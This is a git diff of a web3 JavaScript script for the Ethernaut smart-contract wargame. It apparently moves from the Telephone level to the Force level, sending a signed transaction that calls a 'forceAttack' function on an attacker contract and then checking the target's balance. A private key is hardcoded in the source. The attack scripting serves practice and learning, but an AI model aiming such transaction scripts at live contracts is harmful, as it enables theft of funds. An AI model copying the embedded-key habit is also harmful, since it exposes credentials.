@@ -8,9 +8,9 @@ const web3 = new Web3(infuraProvider);
 const privateKey = '0x1D5906FCC19C3641DF21665D42138610A8BC33D6735BB5D06C387AE08B9CC081';
 const account = web3.eth.accounts.privateKeyToAccount(privateKey);
 
-const solArtifact = JSON.parse(fs.readFileSync(path.resolve(__dirname, '../build/contracts/TelephoneSol.json')));
+const solArtifact = JSON.parse(fs.readFileSync(path.resolve(__dirname, '../build/contracts/ForceSol.json')));
 const artifact = JSON.parse(fs.readFileSync(path.resolve(__dirname, '../build/contracts/Telephone.json')));
-const address = '0x9d84c8e81bb9a7569e554d87f3b140c92b6f20ec';
+const address = '0xeDa14354C69067B1BA2D932627efD343518F820a';
 const solAddress = solArtifact.networks['3'].address;
 debugEthernaut('solAddress', solAddress);
 const solContract = new web3.eth.Contract(solArtifact.abi, solAddress);
@@ -18,12 +18,9 @@ const contract = new web3.eth.Contract(artifact.abi, address);
 
 const ethernaut = async () => {
   try {
-    const estimatedGas = await solContract.methods.hackThePhone().estimateGas();
+    const estimatedGas = await solContract.methods.forceAttack(address).estimateGas();
     debugEthernaut('estimated gas', estimatedGas);
-    const transactionData = await solContract.methods.hackThePhone().encodeABI();
-    // The next 2 lines are the response
-    const signature = web3.utils.keccak256('pwn()').slice(0, 10);
-    debugEthernaut('signature', signature);
+    const transactionData = await solContract.methods.forceAttack(address).encodeABI();
     debugEthernaut('data', transactionData);
     const transaction = {
       from: account.address,
@@ -38,9 +35,8 @@ const ethernaut = async () => {
     debugEthernaut('signedTx:\n', signedTx);
     const txResult = await web3.eth.sendSignedTransaction(signedTx.rawTransaction);
     debugEthernaut('txResult:\n', txResult);
-    const owner = await contract.methods.owner().call();
-    debugEthernaut('owner', owner);
-    debugEthernaut('address', account.address);
+    const contractBalance = await web3.eth.getBalance(address);
+    debugEthernaut('contractBalance', contractBalance);
   } catch (error) {
     debugError(error);
   }
